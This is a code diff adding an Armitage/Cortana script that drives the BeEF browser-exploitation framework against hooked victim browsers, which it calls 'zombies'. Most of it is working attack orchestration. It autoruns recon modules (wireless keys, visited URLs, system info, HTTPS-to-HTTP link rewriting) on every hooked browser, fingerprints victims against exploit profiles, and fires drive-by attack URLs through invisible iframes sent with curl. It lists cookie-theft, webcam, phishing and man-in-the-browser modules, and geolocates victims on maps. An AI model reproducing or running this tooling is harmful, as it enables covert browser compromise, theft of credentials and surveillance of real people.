+		$domain = [OfflineClass extractZombieData: $jsonTxt, $i, "domain"]; 
+		$port = [OfflineClass extractZombieData: $jsonTxt, $i, "port"]; 
+		$page_uri = [OfflineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
+		$session = [OfflineClass extractZombieData: $jsonTxt, $i, "session"];
+		%hostoff = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
+		@beef_hostsoff[$i] = %hostoff;	
+		}
+		$size_on = size(@beef_hosts);  $size_off = size(@beef_hostsoff);
+# Fire event when there is a positive variation of zombies's number.	
+  if ($zombieNumMonitor < $size_on){
+		update_profile();
+		append($console, "\c9 [+] New zombie(s) join the horde");
+		println("\c9 [+] New zombie(s) join the horde");
+		say("New zombie(s) join the horde");
+		$prevnum = $zombieNumMonitor ;
+		$zombieNumMonitor = $size_on ;
+		$newnum = $zombieNumMonitor ; 
+		fire_event("zombies_news", $prevnum, $newnum);
+		} 
+	if ($zombieNumMonitor > $size_on){
+		append($console, "\c4 [-] Some zombies have leave the horde");
+		println("\c4 [-] Some zombies have leave the horde");
+		say("Some zombies have leave the horde");
+		$zombieNumMonitor = $size_on ;
+		update_profile();
+		}
+	} else { append($console, "\c4[!]No Key available");}
+}
+#################################### GIVE ME MY SHELL ! ###########################
+# I love this action, it send invisible iframe to your target so easily that you can play with client-side exploit like you do with remote exploit. :-D awesome !
+sub run_driveby {
+	result_tracker($1, $2, "--");
+	$link = "" . $1 . "/api/modules/" . $2 . "/" . $code_inviframe . "?token=$3";
+	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"" . $4 . "\"}' -X POST " . $link . "";
+	cmd($console , "$attak");
+	say("Send invisible iFrame: " . $4 . " via Beef_Strike ");
+	}
+# this action show an info box with details about a particular zombie
+sub zombi_info {
+   $BrowserName = @browser_profile_list[$1]["Browser"] ;
+   $BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
+   $BrowserReportedName = @browser_profile_list[$1]["UserAgent"] ;
+   $BrowserType = @browser_profile_list[$1]["Type"] ;
+   $BrowserVersion = @browser_profile_list[$1]["Version"] ;
+   $HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
+   $HasFlash = @browser_profile_list[$1]["Flash"] ;
+   $HasGoogleGears = @browser_profile_list[$1]["GoogleGears"] ;
+   $HasWebSocket = @browser_profile_list[$1]["WebSocket"] ;
+   $HostName = @browser_profile_list[$1]["HostName"] ;
+   $JavaEnabled = @browser_profile_list[$1]["Java"] ;
+   $OsName = @browser_profile_list[$1]["OS"] ;
+   $SystemPlatform = @browser_profile_list[$1]["Platform"] ;
+   $VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
+   show_message( "BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
+   append($console ,"\c8 ZOMBIE INFOS \n BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
+
+   }
+
+###################   JSON Processing ---- BEEF COMMANDS ---- #####################
+sub fill_cmde_tab {
+	sleep(100);
+	table_set($1, @beef_cmde);
+	}
+
+sub cmde_info {
+	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "?token=" . $key . "";
+	$cmdeid = [BeefRequester BeefGetRequest: "$link2"]; sleep(100);
+	$jsoncmdeinfo = [new JSONObject];
+	$jsoncmdeinfo = [JSONSerializer toJSON: "$cmdeid"];
+    $name = [[$jsoncmdeinfo get: "name"] toString];
+    $description = [[$jsoncmdeinfo get: "description"] toString];
+    $options = [[$jsoncmdeinfo get: "options"] toString];
+    show_message( "Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
+    append($console , " \c8 COMMANDE INFOS \n Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
+}
+# Prepare command that will be available from zombie sub-menu
+sub fill {
+	$cmd_list_link = "" . $beefUrl . "/api/modules?token=" . $key . "";
+	$jsonTxt_cmde = [BeefRequester BeefGetRequest: "$cmd_list_link"];
+   $c = [CommandList extractCommands: $jsonTxt_cmde] ;
+	for ($i = 0; $i < [$c size]; $i++)   {
+		$id = [CommandList extractcmdData: $jsonTxt_cmde, $i, "id"]; 
+		$name = [CommandList extractcmdData: $jsonTxt_cmde, $i, "name"];  
+		$category = [CommandList extractcmdData: $jsonTxt_cmde, $i, "category"]; 
+		%cmde = %(id => "$id", name => "$name", category => "$category");
+		@beef_cmde[$i] = %cmde;
+		#PERSISTENCE
+		if ( $name eq "Man-In-The-Browser") { $code_mitb = $id;}
+		if ( $name eq "Unhook") { $code_unhook = $id;}
+		# RECON
+		if ( $name eq "Port Scanner") { $code_portscan = $id;}
+		if ( $name eq "DNS Enumeration") { $code_dnsenum = $id;}
+		if ( $name eq "Fingerprint Network") { $code_fingnetwork = $id;}
+		if ( $name eq "Fingerprint Browser") { $code_fingbrowser = $id;}
+		if ( $name eq "Get Internal IP") { $code_ipnat = $id;}
+		if ( $name eq "Get System Info") { $code_sysinfo = $id;}
+		if ( $name eq "Get Wireless Keys") { $code_wireless = $id;}
+		if ( $name eq "Replace HREFs (HTTPS)") { $code_replacehttps = $id;}
+		if ( $name eq "Ping Sweep (Java)") { $code_pingjav = $id;}
+		if ( $name eq "Get Visited URLs") { $code_visitedurl = $id;}
+		if ( $name eq "Detect Software") { $code_detectsoft = $id;}
+		if ( $name eq "Get Visited Domains") { $code_visitedomain = $id;}
+		#ATTACK
+		if ( $name eq "Create Invisible Iframe") { $code_inviframe = $id;}
+		if ( $name eq "Raw JavasScript") { $code_rawjs = $id;}
+		#SPECIAL
+		if ( $name eq "Get Cookie") { $code_getcookie = $id;}
+		if ( $name eq "Spyder Eye") { $code_screenshot = $id;}
+		if ( $name eq "Get Geolocation") { $code_geoloc = $id;}
+		if ( $name eq "Webcam") { $code_webcam = $id;}
+		#SOCIAL ENG
+		if ( $name eq "Fake Flash Update") { $code_fakeflash = $id;}
+		if ( $name eq "Clickjacking") { $code_clickjak = $id;}
+		if ( $name eq "TabNabbing") { $code_tabnabbing = $id;}
+		if ( $name eq "Pretty Theft") { $code_theft = $id;}
+		if ( $name eq "Clippy") { $code_clippy = $id;}
+		#PERSISTENCE
+		if ( $name eq "Man-In-The-Browser") { $code_persist_mitb = $id;}
+		if ( $name eq "Create Foreground iFrame") { $code_persist_iframe = $id;}
+		if ( $name eq "Confirm Close Tab") { $code_persist_closetab = $id;}
+		}
+}
+
+popup autorun_hook {
+		@ccr = flatten(table_selected($1, "id"));
+		$ccr = @ccr[0];
+		item "Informations" { 
+			cmde_info($ccr);
+				}
+		item "Copy CC" {
+		clipboard_set(join(", ", table_selected_single($1, "cc")));
+				}
+}
+
+popup cmde_hook {
+			@idr = flatten(table_selected($1, "id"));
+			@namedr = flatten(table_selected($1, "name"));
+			@catdr = flatten(table_selected($1, "category"));
+			$idr = @idr[0];
+			$namedr = @namedr[0];
+			$catdr = @catdr[0];
+			item "Informations" { 
+				cmde_info($idr);
+				}
+			menu "Add to autorun list" {
+					item "For All" {%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "All", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "IExplorer (IE)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "IE", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Firefox (FF)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "FF", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Chrome (C)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "C", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Opera (O)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "O", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Safary (S)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "S", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Unknow(UN)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "UN", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+					item "Use as a Targeted command"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "Sniper", Param => "");
+						@beef_autorun[$id_beef_autorun] = %cmde;
+						$id_beef_autorun = $id_beef_autorun + 1 ;	}
+			}
+}
+
+###########################  HOST Sub-Menu ###########################
+popup host_bottom {
+	item "BeEF" {local('$zombitableoff');
+			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
+			refresh_hostsoff($zombitableoff);
+			# two tab is open for Online and offline zombies.
+			local('$zombitable');
+			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh","More details"), "zmb_hook", 1);
+			refresh_hosts($zombitable);
+			}
+	menu "Geolocate" {
+			item "Satellite" {
+				$freegeoip_url = "http://freegeoip.net/json/" . $1 . "";
+				$maptype = "satellite";
+				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+				geomap($json_freegeoip, $maptype);
+				}
+			item "Roadmap" {
+				$freegeoip_url = "http://freegeoip.net/json/" . $1 . "";
+				$maptype = "roadmap";
+				$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+				geomap($json_freegeoip, $maptype);
+				}	
+			item "Geobytes web page" {
+				 $geobyte_url = "http://www.geobytes.com/IpLocator.htm?GetLocation&IpAddress=" ;
+				 url_open("$geobyte_url $+ $1"); 
+  				}		
+		}
+}
+######################## HOST ICON ###################################
+# when zombie is offline icon will turn red. This filter show you the browser hooked icon
+filter host_image {
+	local('$ip $ipoff $name $nameoff');
+	$address = $2['address'];
+# Blue beef ICON for online zombie
+	
+	for ($i = 0; $i < size(@beef_hostsoff); $i++ ) {
+		%hostoff = @beef_hostsoff[$i];
+		$ipoff = %hostoff['ip'];
+		$nameoff = %hostoff['name'];
+		if ($ipoff eq $address ){
+				push($1, script_resource("zombieoff.png"));
+				break;
+			}
+	}
+	for ($i = 0; $i < size(@beef_hosts); $i++ ) {
+		%host = @beef_hosts[$i];
+		$ip = %host['ip'];
+		$name = %host['name'];
+		if ($ip eq $address ){
+				push($1, script_resource("zombie.png"));
+				if ($name eq "IE"){
+				push($1, script_resource("iexplorer_hk.png"));
+				} 
+				if ($name eq "FF"){
+				push($1, script_resource("firefox_hk.png"));
+				}
+				if ($name eq "C"){
+				push($1, script_resource("chrome_hk.png"));
+				}
+				if ($name eq "O"){
+				push($1, script_resource("opera_hk.png"));
+				}
+				if ($name eq "S"){
+				push($1, script_resource("safari_hk.png"));
+				}
+				if ($name eq "UN" || $name eq "null"){
+				push($1, script_resource("unknow_hk.png"));
+				}
+			}
+		}
+		# ICON appearance When sniper is targeting some browser.
+		for ($i = 0; $i < size(@analyze); $i++ ) {
+		%target_dr = @analyze[$i];
+		$iptarget = %target_dr['ip'];
+		if ($iptarget eq $address ){
+			push($1, script_resource("sniper.png"));
+			}
+		}
+	return @_;
+}
+
+######################## GEOLOCATE  ZOMBIE ON A MAP ##################
+# 	Use freegeoip.net web services 	  						  		 #
+sub geomap {
+	$js = [new JSONObject];
+	$js = [JSONSerializer toJSON: "$1"];
+   $ipmap = [[$js get: "ip"] toString];
+   $country = [[$js get: "country_name"] toString];
+   $city = [[$js get: "city"] toString];
+   $lat = [[$js get: "latitude"] toString];
+   $lon = [[$js get: "longitude"] toString];
+   $map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&center=" . $lat . "," . $lon . "&maptype=" . $2 . "&zoom=16&sensor=false";
+   $rndval = rand(9999);
+   $mapfile = "$ipmap $+ $rndval $+ .png" ;
+   cmd($console , "wget \"$map_url\" -O /root/.armitage/loots/" . $mapfile . ""); sleep(1000);
+   $map_tab = open_image_tab("Geolocate", @(), @("No Image ? Try to Refresh Map","Map informations"));
+   set_image($map_tab, file_get("/root/.armitage/loots/" . $mapfile . ""));
+}
+sub refresh_map {
+	set_image($1, file_get("/root/.armitage/loots/" . $mapfile . "") );
+	}
+on tab_image_click {
+	if ($3 eq "No Image ? Try to Refresh Map") {
+		refresh_map($1);
+		} 
+	if ($3 eq "Map informations") {
+		show_message( "IP: " . $ipmap . "\n +---------------------+\n COUNTRY: " . $country . "\n CITY: " . $city . "\n +---All maps are saved in the loots---+");
+   		} 		
+	}                       
+								
+#                               ____________
+#                              | Ooh Yeah ! |
+#                              |____________|
+# _______  _____________________||________||___
+#[_______==______________,----------._ [====]o'""-,__....----=====
+#                  [____(oooooooooooo)___________/__________     |
+#        Browser Sniper  //""""""""""  |====| [_)           \    |
+#                       // \\          |====| 	             \   |
+#                      //   \\         |====|                 """"
+#                     (_)   (_)        `----'
+ 
+popup attacks {
+	menu "Browser Sniper"{
+
+	item "Commands" {
+			local('$commandtab');
+			$commandtab = open_table_tab("Commands", "", @("id","name","category"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
+			fill_cmde_tab($commandtab);
+			}
+	
+	item "Autorun list" {
+		local('$beef_autorun');
+		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds", "Replay", "Clear All"), "autorun_hook", 1);
+		refresh_list($beef_autorun);
+		}
+		
+	item "Open Drive-by " {
+		local('$sniper');
+		$sniper = open_table_tab("Open Drive-by", "", @("id", "Browser", "UserAgent", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL", "Link_cc"), @(), @("Add", "Refresh profiles","Edit", "Delete", "Line of sight", "Assault Mode"), "sniper_hook", 1);
+		refresh_profiles($sniper);
+		}
+	item "Line of Sight(+) " {
+			local('$attackMap');
+			$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL", "Link_cc"), @(), @("re-Scan", "Change URL", " Attack all", "Assault Mode"), "analyze_hook", 1);
+			refresh_analyze($attackMap);
+		}
+	}
+ }
+popup analyze_hook {
+		# This action send attack_URL (drive-by) agains to a target selected by our Sniper.
+	item "Fire !" { 
+		@sessid = flatten(table_selected($1, "sessionID"));
+		@urlattack = flatten(table_selected($1, "Attack_URL"));
+		@cclink = flatten(table_selected($1, "Link_cc"));
+		$sessid_dr = @sessid[0];
+		$inviframe = @urlattack[0];
+		$cclink = @cclink[0];
+		if ($cclink ne "*" || $cclink ne " " || $cclink ne "-" || $cclink ne ""){
+			$targeted_cmdeid = @beef_autorun[$cclink]["id"];
+			$targeted_cmde_param = @beef_autorun[$cclink]["Param"];
+			send_beefcmd_with_param($sid, $targeted_cmdeid, $targeted_cmde_param,0,$sip); #sleep(50);
+			append($console , "\c9[*] Sniper send targeted command (+)");
+			} 
+		if ($inviframe ne "*" || $inviframe ne " " || $inviframe ne "-" || $inviframe ne ""){
+			run_driveby($beefUrl, $sid, $key, $inviframe);
+			append($console , "\c9[*] Sniper send attack (+)" . $inviframe . " to " . $sid . "" );
+			}
+		}	
+	} 
+
+sub refresh_analyze {
+	table_set($1, @analyze);
+	}
+	
+sub refresh_list {
+	table_set($1, @beef_autorun);
+	}
+	
+sub refresh_details {
+	update_profile();
+	table_set($1, @browser_profile_list);
+	}
+sub load_clientside_recon_mod {
+			show_message("Client-side Recon. modules loaded");
+			if ( $key ne "00000000000000000000000") { 
+			%cmd0 = %(cc => "$id_beef_autorun", id => "$code_fingbrowser", name => "fingerprint browser", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd0; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd1 = %(cc => "$id_beef_autorun", id => "$code_replacehttps", name => "replace https hrefs by http", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd1; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd2 = %(cc => "$id_beef_autorun", id => "$code_visitedomain", name => "get visited domains", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd2; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd3 = %(cc => "$id_beef_autorun", id => "$code_visitedurl", name => "get visited URLs", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd3; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd4 = %(cc => "$id_beef_autorun", id => "$code_wireless", name => "get Wireless keys", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd4; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd5 = %(cc => "$id_beef_autorun", id => "$code_geoloc", name => "get Geolocation", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd5; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd6 = %(cc => "$id_beef_autorun", id => "$code_ipnat", name => "get internal IP (behind NAT)", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd6; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd7 = %(cc => "$id_beef_autorun", id => "$code_sysinfo", name => "get system information", category => "client-side Recon", browser => "All", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd7; $id_beef_autorun = $id_beef_autorun + 1 ;
+			
+			%cmd8 = %(cc => "$id_beef_autorun", id => "$code_detectsoft", name => "detect installed software (IE only)", category => "client-side Recon", browser => "IE", Param => "");
+			@beef_autorun[$id_beef_autorun] = %cmd8; $id_beef_autorun = $id_beef_autorun + 1 ;
+						
+			say("BeEF system profiling modules have been loaded. Check autorun command list");
+			}	
+	}
+	
+#######  PROFILES DEFINITION #####
+# These actions is very important for Sniper's functionnalities: 
+# Here you define what exploits to use against any browser's profiles
+sub refresh_profiles {
+	table_set($1, @targets);
+	}
+#sub edit_cclink {
+#	@idf = flatten(table_selected($1, "id"));
+#	$idf = @idf[0]; 
+#	@cclink = flatten(table_selected($1, "Link_cc"));
+#	$cclink = @cclink[0];
+#		$cclink = prompt_text("Set CC ","$cclink");
+#	%tt = @targets[$idf]
+#   %tt["Link_cc"] = $cclink ;
+#	refresh_list($1);
+#	}
+	
+sub edit_profiles {
+	
+	@i = flatten(table_selected($1, "id"));
+	@brow = flatten(table_selected($1, "Browser"));
+	@ua = flatten(table_selected($1, "UserAgent"));
+	@ver = flatten(table_selected($1, "Version"));
+	@os = flatten(table_selected($1, "OS"));
+	@plat = flatten(table_selected($1, "Platform"));
+	@actv = flatten(table_selected($1, "ActiveX"));
+	@fls = flatten(table_selected($1, "Flash"));
+	@jv = flatten(table_selected($1, "Java"));
+	@vbs = flatten(table_selected($1, "VBScript"));
+	@plg = flatten(table_selected($1, "Plugins"));
+	@urlb = flatten(table_selected($1, "Attack_URL"));
+	@cclink = flatten(table_selected($1, "Link_cc"));
+	
+	$id_dr = @i[0];
+	$brow_dr = @brow[0];
+	$ua = @ua[0];
+	$ver_dr = @ver[0];
+	$os_dr = @os[0];
+	$plat_dr = @plat[0]; 
+	$actv_dr = @actv[0]; 
+	$fls_dr = @fls[0]; 
+	$jv_dr = @jv[0]; 
+	$vbs_dr = @vbs[0]; 
+	$plg_dr = @plg[0]; 
+	$urlb_dr = @urlb[0]; 
+	$cclink = @cclink[0]; 
+	
+	if ($id_dr ne "" || $id_dr ne " ") {
+	$browser_dr = prompt_text("Browser","$brow_dr");
+	$ua_dr = prompt_text("UserAgent","$ua_dr");
+	$version_dr = prompt_text("Version","$ver_dr");
+	$os_dr = prompt_text("OS","$os_dr");
+	$platform_dr = prompt_text("Plateform","$plat_dr");
+	$activex_dr = prompt_text("Activex","$actv_dr");
+	$flash_dr = prompt_text("Flash","$fls_dr");
+	$java_dr = prompt_text("Java","$jv_dr");
+	$vbs_dr = prompt_text("VBScript","$vbs_dr");
+	$plugins_dr = prompt_text("Plugins ","$plg_dr");
+	$url_dr = prompt_text("URL of the attack to link with this profile","$urlb_dr");
+	$cclink = prompt_text("Command Code (cc) from Autorun list to link with this profile","$cclink");
+	%host_dr = %(id => $id_dr, Browser => "$browser_dr", UserAgent => "$ua_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr" , Link_cc => "$cclink");
+	@targets[$id_dr] = %host_dr;
+	refresh_profiles($1);
+	} else {show_message("No Field selected");}
+}
+	
+sub add_profiles {
+	$browser_dr = prompt_text("Browser","*");
+	$ua_dr = prompt_text("UserAgent","*");
+	$version_dr = prompt_text("Version","*");
+	$os_dr = prompt_text("OS","*");
+	$platform_dr = prompt_text("Plateform","*");
+	$activex_dr = prompt_text("Activex","*");
+	$flash_dr = prompt_text("Flash","*");
+	$java_dr = prompt_text("Java","*");
+	$vbs_dr = prompt_text("VBScript","*");
+	$plugins_dr = prompt_text("Plugins ","*");
+	$url_dr = prompt_text("URL of the attack to map with this profile","http://");
+	$cclink = prompt_text("Command Code (cc) from Autorun list to link with this profile","-");
+	%host_dr = %(id => "$targets_id", Browser => "$browser_dr", UserAgent => "$ua_dr", Version => "$version_dr", OS => "$os_dr", Platform => "$platform_dr", ActiveX => "$activex_dr", Flash => "$flash_dr", Java => "$java_dr", VBScript => "$vbs_dr", Plugins => "$plugins_dr" , Attack_URL => "$url_dr" , Link_cc => "$cclink");
+	@targets[$targets_id] = %host_dr;
+	$targets_id = $targets_id + 1 ;
+	refresh_profiles($1);
+	}
+sub delete_profiles {
+	@i = flatten(table_selected($1, "id"));
+	$id_dr = @i[0];
+	removeAt(@targets, $id_dr); 
+	refresh_profiles($1);
+	}
+sub delete_entry {
+	@i = flatten(table_selected($1, "cc"));
+	$cc = @i[0];
+	removeAt(@beef_autorun, $cc); 
+	refresh_list($1);
+	}
+#-----------------=========================================-------------------#
+sub editparam {
+	@cc = flatten(table_selected($1, "cc"));
+	@editparm = flatten(table_selected($1, "Param"));
+	$cc = @cc[0];
+	$editparm = @editparm[0]; 
+	$editparm = prompt_text("Edit Parameter(s)","$editparm");
+	@beef_autorun[$cc]["Param"] = $editparm ;
+	refresh_list($1);
+}
+# This action change attack_URL that have been affected by sniper to a particular zombie.
+sub changeurl {
+	@i = flatten(table_selected($1, "id"));
+	@urlb = flatten(table_selected($1, "Attack_URL"));
+	$id_dr = @i[0];
+	$urlb_dr = @urlb[0];
+	$url_dr = prompt_text("URL of the attack to map with this profile","$urlb_dr");
+	@analyze[$id_dr]["Attack_URL"] = $url_dr ;
+	refresh_analyze($1);
+	}
+
+###- intelligence analysis -####
+sub checker {
+		#local('$match %extract');
+		%extract = $2 ; 
+		println("value checked:"); println("$1 : " . %profile["$1"] . "");
+		if ( %profile["$1"] ne "*"){
+		$eval = %profile["$1"];
+		$match_regex = "(.*|\\s) $+ $eval $+ (\\s|.*)" ;
+		println("regex in use:"); println($match_regex);
+		println("Value to evaluate:"); println(%extract["$1"]);
+		if ( %extract["$1"] ismatch $match_regex ){
+			println("Bot have found that :" . %extract["$1"] . " YES > " . $eval . "");
+			$match = 0; return $match;}
+		else{println("Bot have found that :" . %extract["$1"] . " NO > " . $eval . ""); 
+		$match = 1;  return $match;}	
+	} else { println("pass ..."); $match = 0; return $match;}
+}
+
+sub rematch {
+	clear(@analyze); $id_analyz = 0 ;
+	for ($i = 0; $i < size(@beef_hosts); $i++ ) {
+		%thishost = @beef_hosts[$i];
+		$this_sip = @beef_hosts[$i]["ip"];
+		$this_sid = %thishost['sessionID'];
+			$link = "" . $beefUrl . "/api/hooks/" . $this_sid . "?token=" . $key . "";
+			$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
+			$js = [new JSONObject];
+			$js = [JSONSerializer toJSON: "$details"];
+			$This_BrowserName = [[$js get: "BrowserName"] toString];#used by sniper
+			$This_BrowserPlugins = [[$js get: "BrowserPlugins"] toString];
+			$This_BrowserReportedName = [[$js get: "BrowserReportedName"] toString]; 
+			$This_BrowserType = [[$js get: "BrowserType"] toString];
+			$This_BrowserVersion = [[$js get: "BrowserVersion"] toString];
+			$This_HasActiveX = [[$js get: "HasActiveX"] toString];
+			$This_HasFlash = [[$js get: "HasFlash"] toString];
+			$This_HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
+			$This_HasWebSocket = [[$js get: "HasWebSocket"] toString];
+			$This_HostName = [[$js get: "HostName"] toString];
+			$This_JavaEnabled = [[$js get: "JavaEnabled"] toString];
+			$This_OsName = [[$js get: "OsName"] toString];
+			$This_SystemPlatform = [[$js get: "SystemPlatform"] toString];
+			$This_VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];
+			%extracted = %(id => "$1", sessionID => "$this_sid", Browser => "$This_BrowserName", UserAgent => "$This_BrowserReportedName", Type => "$This_BrowserType", Version => "$This_BrowserVersion", OS => "$This_OsName", Platform => "$This_SystemPlatform", ActiveX => "$This_HasActiveX", Flash => "$This_HasFlash", Java => "$This_JavaEnabled", VBScript => "$This_VBScriptEnabled", Plugins => "$This_BrowserPlugins", GoogleGears => "$This_HasGoogleGears", WebSocket => "$This_HasWebSocket", HostName => "$This_HostName" );
+	
+	println("Check profile existence :"); println(%extracted["Browser"]);
+	# STEP 2  -  Try to find profiles matching with zombies's informations - if the sum is > than 0 => No match ! Pass
+	foreach $index => $value (@targets){
+			%profile = $value;
+			$decision = checker("UserAgent", %extracted) + checker("Browser", %extracted) + checker("Version", %extracted) + checker("OS", %extracted) + checker("Platform", %extracted) + checker("ActiveX", %extracted) + checker("Flash", %extracted) + checker("Java", %extracted) + checker("VBScript", %extracted) + checker("Plugins", %extracted) ;
+	# STEP 3  -  Zombies maps each with a client-side exploit well suited if we found one.				
+			println("$decision");
+ if ($decision == 0){
+			$inviframe = %profile["Attack_URL"];
+			$cclink = %profile["Link_cc"];
+			println("$cclink");
+			%analyz_dr = %(id => "$id_analyz", ip => "$this_sip", sessionID => "$this_sid" , Attack_URL => "$inviframe" , Link_cc => "$cclink" );
+			@analyze[$id_analyz] = %analyz_dr;
+			$id_analyz = $id_analyz + 1 ;
+			append($console , "\c9[+] Sniper has found a target that match with one of your defined profiles " );
+						
+			}else{			
+				}
+			}
+	}
+}
